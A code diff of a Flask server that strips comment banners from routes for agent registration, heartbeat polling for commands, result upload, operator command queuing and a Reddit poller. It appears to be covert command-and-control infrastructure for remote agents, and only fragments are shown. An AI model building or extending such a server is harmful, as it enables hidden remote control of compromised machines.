@@ -14,9 +14,7 @@ db.init_app(app)
 with app.app_context():
     db.create_all()
 
-# ----------------------------
-# Register agent (first time)
-# ----------------------------
+
 @app.route("/register", methods=["POST"])
 def register():
     data = request.get_json()
@@ -46,9 +44,7 @@ def register():
 
     return jsonify({"status": "registered", "agent_id": agent_id})
 
-# ----------------------------
-# Agent heartbeat (polling for commands)
-# ----------------------------
+
 @app.route("/heartbeat", methods=["POST"])
 def heartbeat():
     data = request.get_json()
@@ -71,10 +67,6 @@ def heartbeat():
     })
 
 
-
-# ----------------------------
-# Agent sends command results
-# ----------------------------
 @app.route("/result", methods=["POST"])
 def result():
     data = request.get_json()
@@ -95,9 +87,6 @@ def result():
     return jsonify({"status": "result stored", "command_id": cmd_id})
 
 
-# ----------------------------
-# Operator queues a command (direct or via poller)
-# ----------------------------
 @app.route("/queue", methods=["POST"])
 def queue_command():
     data = request.get_json()
@@ -120,11 +109,6 @@ def queue_command():
         "command_id": new_cmd.id
     })
 
-
-
-# ----------------------------
-# Poller checks if Reddit post processed
-# ----------------------------
 @app.route("/processed/<post_id>", methods=["GET"])
 def check_processed(post_id):
     exists = ProcessedPost.query.get(post_id)
@@ -132,9 +116,6 @@ def check_processed(post_id):
         return jsonify({"status": "processed", "post_id": post_id}), 200
     return jsonify({"status": "not_found"}), 404
 
-# ----------------------------
-# Poller marks Reddit post processed
-# ----------------------------
 @app.route("/processed", methods=["POST"])
 def mark_processed():
     data = request.get_json()
@@ -162,9 +143,6 @@ def list_agents():
         })
     return jsonify(data)
 
-# ----------------------------
-# Reddit Poller (runs in background thread)
-# ----------------------------
 def poll_reddit():
     with open("config.json") as f:
         creds = json.load(f)
